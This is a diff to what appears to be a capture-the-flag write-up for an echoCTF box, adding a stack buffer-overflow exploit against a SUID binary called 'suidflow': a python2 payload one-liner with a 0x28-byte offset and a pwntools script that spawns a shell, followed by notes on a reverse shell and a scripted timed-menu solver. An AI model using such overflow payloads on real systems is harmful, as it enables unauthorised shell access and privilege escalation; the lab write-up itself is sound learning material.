@@ -263,7 +263,7 @@ From there we know that:
 8. Else it prints failed and the value stored in random_value
 ```
 
-So the generated random value isn't possible to get cause there's no way for brute forcing it since each process it runs a new random value is created
+So the generated random value isn't possible to be known cause there's no way for brute forcing it since each process it runs a new random value is created
 
 The vulnerability that lays in the program is the usage of gets(). Using get doesn't check the amount of bytes passed in and we know that the value it receives is stored in an input buffer which can only hold up to 20 bytes of data
 
@@ -331,3 +331,71 @@ Looking at the stack layout we see that:
 ```
 
 Doing the math `0x60 - 0x38 = 0x28` we get the offset
+
+Basically here's the exploit one linear payload
+![image](https://user-images.githubusercontent.com/113513376/219230238-235de410-d2e5-4d1b-abb3-b348f9fcc76e.png)
+
+```
+python2 -c "print 'A'*0x28 + 'sh'" > payload   
+(cat payload;cat) | ./suidflow
+```
+
+Now because i'm learning bof i just want to make a local exploit script for it 🤓
+![image](https://user-images.githubusercontent.com/113513376/219230384-dc9fc49c-b74c-4b98-a346-a2007252f45e.png)
+
+Script avaialble here [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/echoctf/doorknob/exploit.py)
+```
+from pwn import *
+
+io = process('./suidflow')
+
+offset = 0x28
+overflow = 'A' * offset
+sh = 'sh'
+
+payload = overflow + sh
+
+io.sendline(payload)
+io.interactive()
+```
+
+I'll run it on the remote server binary
+![image](https://user-images.githubusercontent.com/113513376/219230612-54a3ed61-ec06-43c5-a520-43a6ae1c0bad.png)
+
+So now i'll get a reverse shell 
+![image](https://user-images.githubusercontent.com/113513376/219231123-be64923c-5ac2-415a-9575-29294168391f.png)
+
+Now we know that there are other services running on the host and we initially got the path of the files leaked from error `/services/central-control.functions`
+
+Checking it shows the files for 3 services running on it
+![image](https://user-images.githubusercontent.com/113513376/219231397-017d0a04-380c-4a30-8c6c-c8a801083d91.png)
+
+Viewing the content shows the other flags 
+
+On port 5903: Shows a service that we need to choose the correct menu and sub menu within 10seconds
+![image](https://user-images.githubusercontent.com/113513376/219234149-a14ca121-d019-4d4d-b2c3-33003f975722.png)
+
+Of cause we can do this manually but scripting would be the best do 
+
+Here's what the script i'll make will do 
+
+```
+1. Connect to the remote service
+2. Strip out the menu and sub menu number
+3. Send the value of menu and sub menu 
+4. Receive the flag
+```
+
+Script avaialble here [Solve](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/echoctf/doorknob/solve.py)
+
+Running the script gives the flag
+![image](https://user-images.githubusercontent.com/113513376/219241374-d9493fed-0e19-4911-bbf8-a477f2488e87.png)
+
+
+And we're done 
+
+<br> <br>
+[Back To Home](../../index.md)
+
+
+
